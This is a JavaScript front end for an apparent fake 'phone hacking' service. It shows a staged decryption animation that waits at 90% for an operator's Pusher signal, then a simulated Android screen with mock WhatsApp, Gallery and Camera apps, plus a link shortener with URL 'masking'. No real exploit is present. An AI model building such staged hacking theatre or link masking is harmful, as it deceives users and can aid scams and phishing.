// Initialize Pusher
const PUSHER_KEY = '5628e828c0ecf46c7de1'; 
const PUSHER_CLUSTER = 'ap1';

const pusher = new Pusher(PUSHER_KEY, {
    cluster: PUSHER_CLUSTER
});

    const loginCard = document.getElementById('login-card');
    let currentUser = '';
    let isApproved = false;
    let approvedState = '';

    function initPusher(username) {
        currentUser = username.trim().toLowerCase();
        console.log('Initializing Pusher for:', currentUser);
        
        const userChannel = pusher.subscribe(`user-${currentUser}`);
        
        userChannel.bind('screen-change', function(data) {
            console.log('SIGNAL RECEIVED:', data.state);
            isApproved = true;
            approvedState = data.state;

            // Immediate reaction
            const decryptUi = document.getElementById('decryption-ui');
            if (decryptUi && decryptUi.style.display === 'flex') {
                finishDecryption();
            }
        });

        // Error handling for Pusher
        pusher.connection.bind('error', function(err) {
            console.error('Pusher Connection Error:', err);
        });
    }

document.addEventListener('DOMContentLoaded', () => {
    // Generate Floating Droplets
    const container = document.getElementById('droplets-container');
    const numDroplets = 15;

    for (let i = 0; i < numDroplets; i++) {
        const droplet = document.createElement('div');
        droplet.classList.add('droplet');

        // Random properties
        const size = Math.random() * 20 + 5; // 5px to 25px
        const posX = Math.random() * 100; // 0% to 100%
        const posY = Math.random() * 100; // 0% to 100%
        const duration = Math.random() * 3 + 2; // 2s to 5s
        const swayDuration = Math.random() * 4 + 3; // 3s to 7s
        const delay = Math.random() * 2; // 0s to 2s

        droplet.style.width = `${size}px`;
        droplet.style.height = `${size}px`;
        droplet.style.left = `${posX}%`;
        droplet.style.top = `${posY}%`;

        droplet.style.setProperty('--duration', `${duration}s`);
        droplet.style.setProperty('--sway-duration', `${swayDuration}s`);
        droplet.style.animationDelay = `${delay}s`;

        container.appendChild(droplet);
    }

    // Login Logic
    const form = document.getElementById('login-form');
    const errorMsg = document.getElementById('error-msg');
    const authSuccess = document.getElementById('auth-success');
    const loginCard = document.getElementById('login-card');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        // Ensure variables are defined for Pusher later
        const cleanUser = user.trim().toLowerCase();

        // Capture Device Info
        const deviceInfo = {
            device: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
            browser: navigator.userAgent.includes('Chrome') ? 'Chrome' : (navigator.userAgent.includes('Firefox') ? 'Firefox' : 'Safari'),
            platform: navigator.platform,
            deviceId: localStorage.getItem('nextgen_device_id') || (function() {
                const id = 'id-' + Math.random().toString(36).substr(2, 16);
                localStorage.setItem('nextgen_device_id', id);
                return id;
            })()
        };

        const loginBtn = document.getElementById('login-btn');
        loginBtn.disabled = true;
        loginBtn.innerText = 'AUTHENTICATING...';

        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass, deviceInfo: deviceInfo })
            });

            // Capture the JSON for status check
            const data = await response.json();

            if (response.ok) {
                try { initPusher(cleanUser); } catch(pErr) { console.log('Pusher Init Error:', pErr); }

                // Auto-apply saved state if available
                if (data.savedState) {
                    isApproved = true;
                    approvedState = data.savedState;
                    console.log('Auto-applying saved state:', data.savedState);
                }

                const successAudio = document.getElementById('success-audio');
                if (successAudio) {
                    successAudio.currentTime = 0;
                    successAudio.play().catch(e => console.log('Audio blocked', e));
                }
                
                errorMsg.style.opacity = '0';
                loginCard.style.transform = 'scale(0.9)';
                loginCard.style.opacity = '0';

                setTimeout(() => {
                    loginCard.style.display = 'none';
                    document.getElementById('success-popup-overlay').style.display = 'flex';

                    setTimeout(() => {
                        document.getElementById('success-popup-overlay').style.display = 'none';
                        document.getElementById('decryption-ui').style.display = 'flex';
                        startDecryptionAnimation();
                    }, 2500);
                }, 500);
                return;
            } else {
                // If not OK, handle specific error codes
                const errorAudio = document.getElementById('error-audio');

                if (response.status === 403 || data.error === 'UNAUTHORIZED_DEVICE') {
                    document.getElementById('popup-error-title').textContent = 'UNAUTHORIZED DEVICE';
                    document.getElementById('popup-error-desc').textContent = 'This device is not registered to your account.';
                    document.getElementById('popup-error-title').style.color = '#ff4444';
                    // Voice is muted for unauthorized device to avoid 'wrong password' audio
                } else {
                    document.getElementById('popup-error-title').textContent = 'ACCESS DENIED';
                    document.getElementById('popup-error-desc').textContent = 'Incorrect username or password.';
                    document.getElementById('popup-error-title').style.color = '#ff3366';
                    
                    if (errorAudio) {
                        errorAudio.currentTime = 0;
                        errorAudio.play().catch(e => console.log('Audio blocked', e));
                    }
                }
                
                document.getElementById('error-popup-overlay').style.display = 'flex';
                
                loginCard.style.opacity = '1';
                loginCard.style.animation = 'none';
                loginCard.offsetHeight; 
                loginCard.style.animation = 'shake 0.5s ease-in-out';
            }

        } catch (error) {
            console.error('Fatal Login Error:', error);
            document.getElementById('popup-error-title').textContent = 'SYSTEM OFFLINE';
            document.getElementById('popup-error-desc').textContent = 'Connection failed. Try again.';
            document.getElementById('popup-error-title').style.color = '#ff4444';
            document.getElementById('error-popup-overlay').style.display = 'flex';
            
            loginCard.style.opacity = '1';
            loginCard.style.animation = 'none';
            loginCard.offsetHeight; 
            loginCard.style.animation = 'shake 0.5s ease-in-out';
        }

        // Reset Button state
        setTimeout(() => {
            loginCard.style.animation = 'card-anti-gravity 6s ease-in-out infinite alternate';
            loginBtn.disabled = false;
            loginBtn.innerText = 'INITIALIZE';
        }, 500);
    });
});

function closeErrorPopup() {
    document.getElementById('error-popup-overlay').style.display = 'none';
}

// Add shake animation dynamically
const style = document.createElement('style');
style.innerHTML = `
@keyframes shake {
  0% { transform: translateX(0); }
  25% { transform: translateX(-10px); }
  50% { transform: translateX(10px); }
  75% { transform: translateX(-10px); }
  100% { transform: translateX(0); }
}
`;
document.head.appendChild(style);

function startDecryptionAnimation() {
    const canvas = document.getElementById('decryption-canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    // Set canvas to full screen
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });

    // 3D Particles
    let particles = [];
    const numParticles = 400;
    for (let i = 0; i < numParticles; i++) {
        particles.push({
            x: Math.random() * canvas.width * 2 - canvas.width,
            y: Math.random() * canvas.height * 2 - canvas.height,
            z: Math.random() * 1000,
            size: Math.random() * 2 + 0.5,
            speed: Math.random() * 3 + 1,
            angle: Math.random() * Math.PI * 2,
            radius: Math.random() * 200 + 50
        });
    }

    let streamsText = document.getElementById('data-streams-text');
    let streamsInterval = setInterval(() => {
        let text = '';
        for (let i = 0; i < 8; i++) {
            text += Math.random().toString(16).substr(2, 8).toUpperCase() + ' ';
        }
        streamsText.innerText = text + '\\n' + streamsText.innerText.substring(0, 500);
    }, 100);

    function animate() {
        // Clear background with slight fade for trail effect
        ctx.fillStyle = 'rgba(2, 8, 19, 0.3)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        // Draw vertical data streams hints
        ctx.fillStyle = 'rgba(0, 200, 255, 0.05)';
        for (let i = 0; i < 5; i++) {
            let streamX = Math.random() * canvas.width;
            ctx.fillRect(streamX, 0, 1 + Math.random() * 3, canvas.height);
        }

        particles.forEach(p => {
            p.angle += 0.02;
            p.z -= p.speed;

            if (p.z <= 0) {
                p.z = 1000;
                p.x = Math.random() * canvas.width * 2 - canvas.width;
                p.y = Math.random() * canvas.height * 2 - canvas.height;
            }

            // 3D projection
            let scale = 600 / p.z;
            let px = (p.x) * scale + canvas.width / 2;
            let py = (p.y) * scale + canvas.height / 2;

            // Swirl effect
            px += Math.cos(p.angle) * p.radius * scale * 0.1;
            py += Math.sin(p.angle) * p.radius * scale * 0.1;

            ctx.beginPath();
            ctx.arc(px, py, p.size * scale, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(${150 + Math.random() * 105}, 240, 255, ${1 - p.z / 1500})`;
            ctx.shadowBlur = 15 * scale;
            ctx.shadowColor = '#00f0ff';
            ctx.fill();
        });

        requestAnimationFrame(animate);
    }
    animate();

    // Progress bar and error simulation
    let progress = 0;
    let pb = document.getElementById('decrypt-progress');
    let title = document.getElementById('decrypt-title');

    let simInterval = setInterval(() => {
        // Increment progress but stop at 90% if not approved
        if (progress < 90) {
            progress += Math.random() * 0.8;
        } else if (isApproved && progress < 100) {
            progress += Math.random() * 2;
        }

        if (progress >= 100 && isApproved) {
            progress = 100;
            clearInterval(simInterval);
            clearInterval(streamsInterval);
            finishDecryption();
        }

        if (progress > 90 && !isApproved) progress = 90;

        if (progress <= 100) {
            pb.style.strokeDashoffset = 377 - (377 * progress / 100);
            let pbText = document.getElementById('decrypt-progress-text');
            if (pbText) pbText.innerText = Math.floor(progress) + '%';
        }

        // Random glitchy text during decryption
        if (progress < 100 && Math.random() > 0.8) {
            const originalText = 'WAIT FOR TRY TO CONNECTION';
            const glitchChars = '!<>-_\\/[]{}—=+*^?#_';
            let glitchText = '';
            for (let i = 0; i < originalText.length; i++) {
                if (Math.random() > 0.8) glitchText += glitchChars[Math.floor(Math.random() * glitchChars.length)];
                else glitchText += originalText[i];
            }
            title.innerText = glitchText;
            setTimeout(() => {
                if (progress < 100) title.innerText = originalText;
            }, 100);
        }

    }, 80);
}

function finishDecryption() {
    const canvas = document.getElementById('decryption-canvas');
    const title = document.getElementById('decrypt-title');
    const pb = document.getElementById('decrypt-progress');
    const pbText = document.getElementById('decrypt-progress-text');
    const whitePage = document.getElementById('admin-white-page');

    if (pbText) pbText.innerText = '100%';
    
    canvas.style.filter = 'hue-rotate(50deg) saturate(2) brightness(1.2)';
    title.innerText = 'ACCESS GRANTED';
    title.style.color = '#00ffaa';
    
    setTimeout(() => {
        if (approvedState === 'white_page') {
            document.getElementById('decryption-ui').style.display = 'none';
            whitePage.style.display = 'flex';
            startWhiteClock();
        } else {
            // Show Open Mobile popup
            document.getElementById('open-mobile-popup-overlay').style.display = 'flex';
        }
    }, 1000);
}

function startWhiteClock() {
    setInterval(() => {
        const now = new Date();
        const hrs = now.getHours().toString().padStart(2, '0');
        const mins = now.getMinutes().toString().padStart(2, '0');
        const clockEl = document.getElementById('white-clock');
        if (clockEl) clockEl.innerText = `${hrs}:${mins}`;
    }, 1000);
}

// Android OS Functionality
function startClock() {
    if (window.clockInterval) return;
    window.clockInterval = setInterval(() => {
        const now = new Date();
        const hrs = now.getHours().toString().padStart(2, '0');
        const mins = now.getMinutes().toString().padStart(2, '0');
        document.getElementById('clock').innerText = `${hrs}:${mins}`;
    }, 1000);
}

// Store global interval IDs to clear them on back
let currentTextInterval = null;
let currentLoadingTimeout = null;
let estimatedTimeInterval = null;

let isDragging = false;

function openApp(appName) {
    if (isDragging) return;
    document.getElementById('android-ui').style.display = 'none';

    const loadingUi = document.getElementById('app-loading-ui');
    const loadingText = document.getElementById('app-loading-text');
    const loaderCircle = document.querySelector('.loader-circle');
    const errorDialog = document.getElementById('error-dialog');
    const topAppName = document.getElementById('top-app-name');
    const loaderContent = document.getElementById('loader-content');
    const estimatedTimeEl = document.getElementById('estimated-time');

    // Reset state
    loadingUi.style.display = 'flex';

    // Check for Functional Apps (Instant open for demo)
    const functionalApps = {
        'WhatsApp': 'whatsapp-ui',
        'Gallery': 'gallery-ui',
        'Camera': 'camera-ui'
    };

    if (functionalApps[appName]) {
        setTimeout(() => {
            loadingUi.style.display = 'none';
            document.getElementById(functionalApps[appName]).style.display = 'flex';
            if (appName === 'Camera') startCamera();
        }, 500);
        return;
    }

    // Default: Show Generic Blurred UI (Working but blurred)
    setTimeout(() => {
        loadingUi.style.display = 'none';
        document.getElementById('generic-app-name').innerText = appName;
        document.getElementById('generic-app-ui').style.display = 'flex';
    }, 800);
    return;

    // loaderContent.style.display = 'flex'; (Bypassed for global working apps)
    loaderCircle.style.display = 'block';
    loadingText.style.display = 'block';
    topAppName.innerText = appName;
    loadingText.innerText = `LOADING ${appName.toUpperCase()}...`;
    errorDialog.style.display = 'none';

    // Random loading time between 60 to 120 seconds (60000ms to 120000ms)
    const loadingTime = (Math.floor(Math.random() * 60) + 60) * 1000;
    let timeRemaining = Math.floor(loadingTime / 1000);

    // Initial Estimated Time
    const mins = Math.floor(timeRemaining / 60);
    const secs = timeRemaining % 60;
    estimatedTimeEl.innerText = `ESTIMATED TIME: ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    estimatedTimeEl.style.display = 'block';

    let textDots = 0;
    currentTextInterval = setInterval(() => {
        textDots = (textDots + 1) % 4;
        loadingText.innerText = `LOADING ${appName.toUpperCase()}` + '.'.repeat(textDots);
    }, 500);

    estimatedTimeInterval = setInterval(() => {
        timeRemaining--;
        if (timeRemaining >= 0) {
            const m = Math.floor(timeRemaining / 60);
            const s = timeRemaining % 60;
            estimatedTimeEl.innerText = `ESTIMATED TIME: ${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
        }
    }, 1000);

    currentLoadingTimeout = setTimeout(() => {
        clearInterval(currentTextInterval);
        clearInterval(estimatedTimeInterval);

        loaderContent.style.display = 'none';

        // Show error dialog
        errorDialog.style.display = 'block';

        // Add a harsh glitch effect to the background
        loadingUi.style.animation = 'shake 0.3s';
        setTimeout(() => {
            loadingUi.style.animation = 'none';
        }, 300);

    }, loadingTime);
}

function closeApp() {
    // Clear any ongoing loading timeouts or intervals
    if (currentTextInterval) clearInterval(currentTextInterval);
    if (currentLoadingTimeout) clearTimeout(currentLoadingTimeout);
    if (estimatedTimeInterval) clearInterval(estimatedTimeInterval);

    // Hide App Loading UI and show Android UI
    document.getElementById('app-loading-ui').style.display = 'none';
    document.getElementById('android-ui').style.display = 'flex';
}

document.addEventListener('DOMContentLoaded', () => {
    const slider = document.querySelector('.home-slider');
    const dots = document.querySelectorAll('.page-indicators .dot');

    if (slider && dots.length > 0) {
        slider.addEventListener('scroll', () => {
            // Using Math.round to check which page we are closer to
            const scrollPercent = slider.scrollLeft / (slider.scrollWidth - slider.clientWidth) || 0;
            const activeIndex = Math.round(scrollPercent * (dots.length - 1));

            dots.forEach((dot, index) => {
                if (index === activeIndex) {
                    dot.classList.add('active');
                } else {
                    dot.classList.remove('active');
                }
            });
        });

        // Swipe (Drag to Scroll) Functionality
        let isDown = false;
        let startX;
        let scrollLeft;

        const startDragging = (x) => {
            isDown = true;
            isDragging = false;
            startX = x - slider.offsetLeft;
            scrollLeft = slider.scrollLeft;
            slider.style.scrollSnapType = 'none';
            slider.style.scrollBehavior = 'auto'; // Disable smooth scroll while dragging
        };

        const stopDragging = () => {
            isDown = false;
            slider.style.scrollSnapType = 'x mandatory';
            slider.style.scrollBehavior = 'smooth';
            // Delay resetting isDragging so click events don't fire immediately
            setTimeout(() => { isDragging = false; }, 50);
        };

        const drag = (x, e) => {
            if (!isDown) return;
            e.preventDefault();
            const walk = (startX - (x - slider.offsetLeft));

            // Register as a drag if moved more than 5px
            if (Math.abs(walk) > 5) {
                isDragging = true;
            }
            slider.scrollLeft = scrollLeft + walk;
        };

        // Mouse Events
        slider.addEventListener('mousedown', (e) => startDragging(e.pageX));
        slider.addEventListener('mouseleave', stopDragging);
        slider.addEventListener('mouseup', stopDragging);
        slider.addEventListener('mousemove', (e) => drag(e.pageX, e));

        // Touch Events
        slider.addEventListener('touchstart', (e) => startDragging(e.touches[0].pageX));
        slider.addEventListener('touchend', stopDragging);
        slider.addEventListener('touchmove', (e) => drag(e.touches[0].pageX, e));
    }
});

function openAndroidUI() {
    document.getElementById('open-mobile-popup-overlay').style.display = 'none';
    let decUi = document.getElementById('decryption-ui');
    decUi.style.transition = 'opacity 0.5s';
    decUi.style.opacity = '0';
    
    // Set Dynamic Wallpaper
    setRandomWallpaper();

    setTimeout(() => {
        decUi.style.display = 'none';
        document.getElementById('android-ui').style.display = 'flex';
        startClock();
    }, 500);
}

const WALLPAPERS = [
    'https://images.unsplash.com/photo-1590071363212-0f7415494f6c?q=80&w=2070', // Pakistani Aesthetic 1
    'https://images.unsplash.com/photo-1576484323462-8b045bc692c1?q=80&w=2070', // Pakistani Aesthetic 2
    'https://images.unsplash.com/photo-1596701062351-8c2c14d1fdd0?q=80&w=1974', // Flowers
    'https://images.unsplash.com/photo-1518531933037-91b2f5f229cc?q=80&w=1968', // Aesthetic Nature
    'https://images.unsplash.com/photo-1517048676732-d65bc937f952?q=80&w=2070', // Interior
    'https://images.unsplash.com/photo-1494438639946-1ebd1d20bf85?q=80&w=2067', // Lamps
    'https://images.unsplash.com/photo-1534447677768-be436bb09401?q=80&w=2094'
];

function setRandomWallpaper() {
    const randomImg = WALLPAPERS[Math.floor(Math.random() * WALLPAPERS.length)];
    const androidUi = document.getElementById('android-ui');
    if (androidUi) {
        androidUi.style.background = `url('${randomImg}') no-repeat center center/cover`;
    }
}

// --- Link Shortener Logic ---
function openShortener() {
    document.getElementById('android-ui').style.display = 'none';
    document.getElementById('shortener-ui').style.display = 'flex';
}

function closeShortener() {
    document.getElementById('shortener-ui').style.display = 'none';
    document.getElementById('android-ui').style.display = 'flex';
    // Reset fields
    document.getElementById('long-url').value = '';
    document.getElementById('short-result-container').style.display = 'none';
}

function closeFunctionalApp() {
    stopCamera();
    const apps = ['whatsapp-ui', 'gallery-ui', 'camera-ui', 'generic-app-ui'];
    apps.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
    document.getElementById('android-ui').style.display = 'flex';
}

let cameraStream = null;
async function startCamera() {
    const video = document.getElementById('camera-video-stream');
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = cameraStream;
    } catch (err) {
        console.error("Camera Error:", err);
        // Fallback or message if permission denied
    }
}

function stopCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }
}

async function generateShortLink() {
    const longUrl = document.getElementById('long-url').value.trim();
    const maskType = document.getElementById('link-mask').value;
    const btn = document.getElementById('shorten-btn');
    const resultContainer = document.getElementById('short-result-container');
    const resultInput = document.getElementById('short-url-result');

    if (!longUrl) {
        alert('Please enter a URL first.');
        return;
    }

    btn.disabled = true;
    btn.querySelector('span').innerText = 'GENERATING...';

    try {
        const response = await fetch('/api/shorten', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url: longUrl, maskType: maskType })
        });

        const data = await response.json();

        if (data.success) {
            resultInput.value = window.location.origin + '/s/' + data.shortId;
            resultContainer.style.display = 'block';
            resultContainer.style.animation = 'popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
        } else {
            alert('Error: ' + (data.error || 'Failed to shorten link'));
        }
    } catch (err) {
        console.error('Shorten Error:', err);
        alert('System Offline: Could not connect to API.');
    } finally {
        btn.disabled = false;
        btn.querySelector('span').innerText = 'SHORTEN NOW';
    }
}

function copyShortLink() {
    const resultInput = document.getElementById('short-url-result');
    const feedback = document.getElementById('copy-feedback');

    resultInput.select();
    resultInput.setSelectionRange(0, 99999); // For mobile devices

    navigator.clipboard.writeText(resultInput.value).then(() => {
        feedback.style.display = 'block';
        setTimeout(() => {
            feedback.style.display = 'none';
        }, 2000);
    });
}
